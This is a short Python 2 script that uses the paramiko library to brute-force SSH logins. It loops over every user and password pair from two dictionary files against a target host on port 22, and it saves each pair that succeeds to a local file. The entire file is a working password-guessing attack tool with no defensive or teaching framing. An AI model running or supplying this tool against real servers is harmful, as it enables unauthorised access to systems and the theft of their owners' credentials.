#!/usr/bin/python

import paramiko
import time
import optparse


def Credentials_found(user,password):
	file = "ssh_creds_found"
	file1 = open(file, "a")
	credentials =  file1.writelines( user + ":" + password + "\n")


def Cracking_SSH(ip, port_number, user_login, passwd):
	log = paramiko.util.log_to_file("log.log")
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		client.connect(ip,port=port_number,username=user_login,password=passwd)
		print ""
		print("CREDENTIALS FOUND: {}:{}".format(user_login,passwd))
		print ""
		Credentials_found(user_login,passwd)
	except:
		print("Credentials not found")


def Read_Dictionary(ip, port, user, password):
	ip_addr = ip
	port_number = port
	users = open(user,"r")
	users = users.read().split("\n")

	passwords = open(password, "r")
	passwords = passwords.read().split("\n")

	for user_line in users:
		for pass_line in passwords:
			time.sleep(3)
			Cracking_SSH(ip_addr, port_number, user_line, pass_line)


def main():
	parser = optparse.OptionParser("./Program.py -H <SSH Server> -U <User_Dictionary> - P <Pasword_Dictionary>")
	parser.add_option("-H", dest="Ip_Address", type="string", help="Specify the ip address")
	parser.add_option("-U", dest="User_file", type="string", help="Specify the user dictionary file")
	parser.add_option("-P", dest="Password_file", type="string", help="Specify the password dictionary file")

	port = 22

	(options,args) = parser.parse_args()
	IpHost = options.Ip_Address
	User_dic = options.User_file
	Pass_dic = options.Password_file

	if(IpHost == None) | (User_dic == None) | (Pass_dic == None):
		parser.print_help()
		print ""
		exit(0)

	Read_Dictionary(IpHost, port, User_dic, Pass_dic)

if __name__ == '__main__':
	main()